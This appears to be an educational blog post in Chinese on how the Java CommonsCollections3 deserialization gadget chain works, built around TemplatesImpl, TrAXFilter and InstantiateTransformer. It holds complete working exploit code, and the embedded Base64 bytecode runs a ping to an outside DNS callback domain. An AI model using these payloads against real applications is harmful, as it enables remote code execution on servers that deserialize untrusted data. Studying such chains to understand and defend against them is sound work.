---
layout: mypost
title: "类加载链-CommonsCollections3链"
categories: [Java安全]
---

## 前言

能将 ClassLoader#defineClass 与 CC 链相结合写出的 Payload 其实已经很接近 CommonsCollections3 链了，但是去翻看 ysoserial 中 CommonsCollections3 的源码，发现还是有所不同的，如下-->

![](1.png)

看看到底什么原因？

## 老知识

将利用 TemplatesImpl 类把 ClassLoader#defineClass 与 CC1 链结合的 Payload 美化后，粘一下，不啰嗦了-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1ClassLoader {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTEROUzsBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwAGQAaBwAnDAAoACkBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAqACsBAANETlMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAkACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAAoACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer("newTransformer",null,null),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

执行代码成功触发 DNS 请求，如下-->

![](7.png)

大白话一点就是用 InvokerTransformer 去实现了加载字节码的功能，例如现在有这样一种情况：服务端的防护代码将 Runtime 类过滤掉了，那么如上的 Payload 就是一个很好的解决方案，那如果开发人员将 InvokerTransformer 类给过滤掉呢？历史上还真就有这样的事情发生。

## 历史背景

> 这一段内容完全粘贴自 P 神的文章

2015 年初，@frohoff 和@gebl 发布了[Marshalling Pickles: how deserializing objects will ruin
your day](https://frohoff.github.io/appseccali-marshalling-pickles/)，以及 Java 反序列化利⽤⼯具 ysoserial，随后引爆了安全界。开发者们⾃然会去找寻⼀种安全的过滤⽅法，于是类似 SerialKiller 这样的⼯具随之诞⽣。

[SerialKiller](https://github.com/ikkisoft/SerialKiller)是⼀个 Java 反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在其发布的第⼀个版本代码中，可以看到其给出了最初的[黑名单](https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf)

![](2.png)

这个⿊名单中 InvokerTransformer 赫然在列，也就切断了 CommonsCollections1 的利⽤链，随后增加了不少新的 Gadgets，其中就包括 CommonsCollections3 链。

所以 CC3 链出现的原因是 InvokerTransformer 类被过滤掉了！

## 调 CommonsCollections3 链

不管是 CC1 还是 CC6，都是将 InvokerTransformer 当成了 sink，包括 CC1 加载字节码、CC6 加载字节码，其实也是将 InvokerTransformer 当成了 sink，都是将 invoke 的功能扩大（命令执行、加载恶意字节码）。何尝不可以将 defineClass 方法直接当成 sink 呢？下面是 TemplatesImpl 类从 newTransformer()到 defineClass()的调用链-->

```
TemplatesImpl#newTransformer() ->
    TemplatesImpl#getTransletInstance() ->
        TemplatesImpl#defineTransletClasses() ->
            TransletClassLoader#defineClass()
```

可以看出只要执行 TemplatesImpl 类的 newTransformer()即可完成字节码加载，不一定非要用`new InvokerTransformer("newTransformer",null,null)`这种方式，看一下 newTransformer 方法的调用情况-->

![](3.png)

总共有五处调用，其中 CC3 的作者用到的是 TrAXFilter 类的构造函数，如下-->

![](4.png)

现在只要调用了 TrAXFilter 类的构造函数，就可以触发字节码加载，写个 demo 验证一下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class CommonsCollections3  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        new TrAXFilter(templatesImpl);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

执行代码成功触发 DNS 请求，如下-->

![](7.png)

而现在不能用 InvokerTransformer 去执行`new TrAXFilter(templatesImpl);`这行代码，这⾥会⽤到⼀个新的
Transformer 类-->`org.apache.commons.collections.functors.InstantiateTransformer`。
它的 transform 方法的作⽤就是以反射的形式调⽤构造⽅法。

![](5.png)

现在将上面的 demo 改成 InstantiateTransformer 的写法，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.Base64;

public class CommonsCollections3  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl});
        instantiateTransformer.transform(clazz);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

执行代码成功触发 DNS 请求，如下-->

![](7.png)

Tips：TrAXFilter 类其实是没有继承 Serializable 接口的-->

![](6.png)

但 instantiateTransformer 的 transform 方法是反射调用了构造器-->`Constructor con = ((Class) input).getConstructor(iParamTypes);`，只需要给 transform 方法的参数传一个 Class 对象即可。这一点无形之中解决了 TrAXFilter 类无法被序列化的问题。

接下来将 CC1、CC6 链的 EntryClass 以及一部分 Gadget 与上面 demo 结合起来，将代码美化一下即可得到 CommonsCollections3 链，如下（这里拿 CC6 举例，它不依赖于 JDK 版本）-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl}
                ),
                new ConstantTransformer(1),
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

执行代码成功触发 DNS 请求，如下-->

![](7.png)

至此，CommonsCollections3 链从 0 到 1 结束。